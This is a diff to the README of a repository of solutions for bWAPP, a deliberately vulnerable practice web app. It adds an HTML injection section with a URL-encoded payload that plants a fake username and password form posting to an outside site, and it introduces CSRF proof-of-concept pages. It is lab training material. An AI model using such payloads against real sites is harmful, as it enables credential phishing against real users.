@@ -1,6 +1,21 @@
 # bWAPP
 Some bWAPP solutions :)
+# A1 - Injection
+Below are the html form tags that should be entered in the username.
 
+## HTML Injection - Reflected (GET)
+
+- Security-Level : Low
+
+    Please visit [html_1](https://github.com/divyanshu29/bWAPP/blob/master/HTML_Injection/html_1_low.html) for solution.
+    
+- Security-Level : Medium
+
+   Enter below in username for HTML Injection
+   ```
+   %3Cform%20action%3D%22https%3A%2f%2fgoogle.com%22%3E%20%3Cinput%20type%3D%22text%22%20placeholder%3D%22Username%22%3E%3C%2fbr%3E%3C%2fbr%3E%20%3Cinput%20type%3D%22password%22%20placeholder%3D%22Password%22%3E%3C%2fbr%3E%3C%2fbr%3E%20%3Cinput%20type%3D%22submit%22%20value%3D%22Submit%22%3E%20%3C%2fform%3E
+   ```
+   
 # A8 - Cross Site Request Forgery(CSRF)
 Below are the POC html pages. Open them in your server and click on button to perform the attack
 
